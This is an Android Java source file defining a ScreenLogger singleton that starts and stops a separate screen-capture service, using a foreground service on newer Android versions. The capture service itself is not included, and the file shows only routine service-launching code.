package com.xrc.system.features;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.xrc.system.core.Constants;
import com.xrc.system.service.ScreenCaptureService;

public class ScreenLogger {
    private static final String TAG = Constants.TAG + ":ScreenLog";
    private static ScreenLogger instance;
    private final Context ctx;

    private ScreenLogger(Context ctx) {
        this.ctx = ctx.getApplicationContext();
    }

    public static synchronized ScreenLogger get(Context ctx) {
        if (instance == null) instance = new ScreenLogger(ctx);
        return instance;
    }

    public void startCapture() {
        try {
            Intent intent = new Intent(ctx, ScreenCaptureService.class);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                ctx.startForegroundService(intent);
            } else {
                ctx.startService(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Start capture failed", e);
        }
    }

    public void stopCapture() {
        try {
            ctx.stopService(new Intent(ctx, ScreenCaptureService.class));
        } catch (Exception e) {
            Log.e(TAG, "Stop capture failed", e);
        }
    }

    public void takeScreenshot() {
        startCapture();
    }
}
